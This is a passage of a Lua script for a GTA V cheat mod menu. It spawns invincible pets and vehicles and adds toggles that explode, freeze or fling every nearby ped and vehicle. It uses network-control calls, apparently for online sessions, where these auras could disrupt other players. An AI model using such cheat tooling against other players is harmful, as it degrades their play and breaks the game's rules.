    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 2, -1, 0.25, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet GermanShepherd (Dog)", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Shepherd")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 2, -1, 0.25, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Rottweiler (Dog)", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Rottweiler")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 2, -1, 0.25, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Rat", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Rat")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Pug (Dog)", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Pug")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 2, -1, 0.25, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Poodle (Dog)", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Poodle")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0.25, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Boar", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Boar")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet ChickenHawk", {}, "Bro Is A Like A Snail You Might Forget About Him", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_ChickenHawk")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Chop (Dog)", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Chop")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 2, -1, 0.25, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Coyote", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Coyote")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Deer", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Deer")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Crow", {}, "Bro Is A Like A Snail You Might Forget About Him", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Crow")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Pig", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Pig")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Cormorant (Bird)", {}, "It's A Bird", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Cormorant")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Another Pet Monkey", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Rhesus")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Mountain Lion", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_mtlion")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Panther", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_panther")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

--------------------------------------------------------------------------------------------------------------------------------------------

--Taken From NovaScript

--auras--
local aura_list = menu.list(fun, "Aura's", {}, "")

--aura radius--
local aura_radius = 50
menu.slider(aura_list, "Aura Radius", {}, "", 5, 200, 10, 1, function(count)
    aura_radius = count
end)

--explosion aura--
menu.toggle_loop(aura_list, "Explosive Aura", {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local user_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != user_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(players.user_ped(), vehicle_pos) <= aura_radius then
                if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(vehicle_handle) >= 0 then
                    FIRE.ADD_EXPLOSION(vehicle_pos.x, vehicle_pos.y, vehicle_pos.z, 1, 1, false, true, 0.0, false)
                end
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
    for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != players.user_ped() then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(players.user_ped(), ped_pos) <= aura_radius then
                if not PED.IS_PED_DEAD_OR_DYING(ped_handle, true) then
		    	    FIRE.ADD_EXPLOSION(ped_pos.x, ped_pos.y, ped_pos.z, 1, 1, false, true, 0.0, false)
                end
		    end
        end
	end
end)

--push aura--
--got this calculation from wiriscript--
menu.toggle_loop(aura_list, "Push Aura", {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local user_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != user_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(players.user_ped(), vehicle_pos) <= aura_radius then
                local rel = v3.new(vehicle_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --scales the v3 to have a length of 1--
                rel:normalise()
                ENTITY.APPLY_FORCE_TO_ENTITY(vehicle_handle, 3, rel.x, rel.y, rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != players.user_ped() then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(players.user_ped(), ped_pos) <= aura_radius then
                local rel = v3.new(ped_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --scales the v3 to have a length of 1--
                rel:normalise()
                PED.SET_PED_TO_RAGDOLL(ped_handle, 2500, 0, 0, false, false, false)
		    	ENTITY.APPLY_FORCE_TO_ENTITY(ped_handle, 3, rel.x, rel.y, rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
		    end
        end
	end
end)

--pull aura--
--got this calculation from wiriscript--
menu.toggle_loop(aura_list, "Pull Aura", {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local user_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != user_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(players.user_ped(), vehicle_pos) <= aura_radius then
                local rel = v3.new(vehicle_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --scales the v3 to have a length of 1--
                rel:normalise()
                ENTITY.APPLY_FORCE_TO_ENTITY(vehicle_handle, 3, -rel.x, -rel.y, -rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != players.user_ped() then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(players.user_ped(), ped_pos) <= aura_radius then
                local rel = v3.new(ped_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --scales the v3 to have a length of 1--
                rel:normalise()
                PED.SET_PED_TO_RAGDOLL(ped_handle, 2500, 0, 0, false, false, false)
		    	ENTITY.APPLY_FORCE_TO_ENTITY(ped_handle, 3, -rel.x, -rel.y, -rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
		    end
        end
	end
end)

--freeze aura--
menu.toggle_loop(aura_list, "Freeze Aura", {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local user_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != user_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(players.user_ped(), vehicle_pos) <= aura_radius then
                ENTITY.FREEZE_ENTITY_POSITION(vehicle_handle, true)
            else
                ENTITY.FREEZE_ENTITY_POSITION(vehicle_handle, false)
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != players.user_ped() then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(players.user_ped(), ped_pos) <= aura_radius then
                if not PED.IS_PED_IN_ANY_VEHICLE(ped_handle, false) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped_handle)
                end
                ENTITY.FREEZE_ENTITY_POSITION(ped_handle, true)
            else
                ENTITY.FREEZE_ENTITY_POSITION(ped_handle, false)
            end
        end
	end
end)

--boost aura--
menu.toggle_loop(aura_list, "Boost Aura", {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local user_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != user_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(players.user_ped(), vehicle_pos) <= aura_radius then
                local rel = v3.new(vehicle_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --turn rel into a rot--
                local rot = rel:toRot()
                ENTITY.SET_ENTITY_ROTATION(vehicle_handle, rot.x, rot.y, rot.z, 2, false)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle_handle, 100)
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != players.user_ped() then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(players.user_ped(), ped_pos) <= aura_radius then
                local rel = v3.new(ped_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --multiply rel with 100--
                rel:mul(100)
                PED.SET_PED_TO_RAGDOLL(ped_handle, 2500, 0, 0, false, false, false)
		    	ENTITY.APPLY_FORCE_TO_ENTITY(ped_handle, 3, rel.x, rel.y, rel.z, 0, 0, 1.0, 0, false, false, true, false, false)
            end
        end
	end
end)

--------------------------------------------------------------------------------------------------------------------------------------

--water bounce height--
local bounce_height = 15
menu.slider(fun, "Bounce Height", {}, "", 1, 100, 15, 1, function(count)
	bounce_height = count
end)

menu.toggle_loop(fun, "Bouncy Water", {}, "", function()
	if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
		if ENTITY.IS_ENTITY_IN_WATER(entities.get_user_vehicle_as_handle(false)) then
			local vel = v3.new(ENTITY.GET_ENTITY_VELOCITY(entities.get_user_vehicle_as_handle(false)))
			ENTITY.SET_ENTITY_VELOCITY(entities.get_user_vehicle_as_handle(false), vel.x, vel.y, bounce_height)
		end
	else
		if ENTITY.IS_ENTITY_IN_WATER(players.user_ped()) then
			local vel = v3.new(ENTITY.GET_ENTITY_VELOCITY(entities.get_user_vehicle_as_handle(false)))
			ENTITY.SET_ENTITY_VELOCITY(players.user_ped(), vel.x, vel.y, bounce_height)
		end
	end
end)

menu.toggle(fun, "Tesla Mode", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
       if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)

menu.toggle(fun, "Drive Cop Heli", {"copheli"}, "Plus bodygaurds.", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("bodyguardmodel S_M_Y_Swat_01")
        menu.trigger_commands("bodyguardcount 3")
        menu.trigger_commands("bodyguardprimary smg")
        menu.trigger_commands("spawnbodyguards")
        menu.trigger_commands("smyswat01")
        menu.trigger_commands("otr")
        local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
        util.yield(3000)
        menu.trigger_command(Imortality_BodyGuards)
        util.toast("Make way for the heli.")
        util.yield(3000)
        local vehicleHash = util.joaat("polmav")
        request_model(vehicleHash)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        copheli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        --ENTITY.SET_ENTITY_VISIBLE(copheli, false, false)
        --ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(copheli, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(copheli, true)
        VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(copheli, 0.0)
        local id = get_closest_vehicle(entity)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(copheli, pos.x, pos.y, pos.z, false, false, true)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), copheli, -1)
        util.yield(1500)
        menu.trigger_commands("livery -1")
    else
        local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
        menu.trigger_command(Imortality_BodyGuards)
        menu.trigger_commands("delbodyguards")
        menu.trigger_commands("deletevehicle")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("otr")
        util.toast("Change you're outfit to get clothes normal again.")
    end
end)


menu.toggle(fun, "Drive Cop Car", {"copcar"}, "Plus a bodygaurd.", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("bodyguardmodel S_M_Y_Cop_01")
        menu.trigger_commands("bodyguardcount 1")
        menu.trigger_commands("bodyguardprimary pistol")
        menu.trigger_commands("spawnbodyguards")
        menu.trigger_commands("SMYCop01")
        menu.trigger_commands("otr")
        local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
        util.yield(1000)
        menu.trigger_command(Imortality_BodyGuards)
        local vehicleHash = util.joaat("police3")
        request_model(vehicleHash)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        copheli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        VEHICLE.SET_VEHICLE_ENGINE_ON(copheli, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(copheli, true)
        VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(copheli, 0.0)
        VEHICLE.SET_VEHICLE_MOD_KIT(copheli, -1)
        local id = get_closest_vehicle(entity)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(copheli, pos.x, pos.y, pos.z, false, false, true)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), copheli, -1)
    else
        local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
        menu.trigger_command(Imortality_BodyGuards)
        menu.trigger_commands("delbodyguards")
        menu.trigger_commands("deletevehicle")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("otr")
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Misc

menu.hyperlink(misc, "Github Link", "https://github.com/Fewdys/GTA5-FewMod-Lua")

menu.action(misc, "Clear All Notifications", {}, "", function()
    menu.trigger_commands("clearnotifications")
    menu.trigger_commands("removenotifications")
end)

